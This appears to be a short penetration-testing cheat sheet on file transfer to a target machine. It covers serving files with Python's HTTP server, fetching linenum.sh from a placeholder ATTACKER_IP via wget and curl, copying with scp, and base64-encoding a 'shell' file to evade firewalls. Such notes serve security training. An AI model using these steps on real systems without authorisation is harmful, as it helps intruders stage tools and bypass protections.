### wget

**Start the python simple http server**
```
cd/tmp
python3 -m http.server 8000
```

**Download file on remote machine**
```
wget http://ATTACKER_IP:8000/linenum.sh
```


### curl

```
curl http://ATTACKER_IP:8000/linenum.sh -o linenum.sh
```

### scp

```
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

### base64

Use this technique to evade firewall and other protections.
Base64 encode the file first.
```
base64 shell -w 0
```

Then decode once you have transferred using any method or either of the above methods

```
echo "name_of_String" | base64 -d
```

### Validate Transferred Files

After the file has been delivered, validate the format of the file

```
file shell
```

We can also use the md5sum command to validate the md5 hash

```
md5sum shell
```
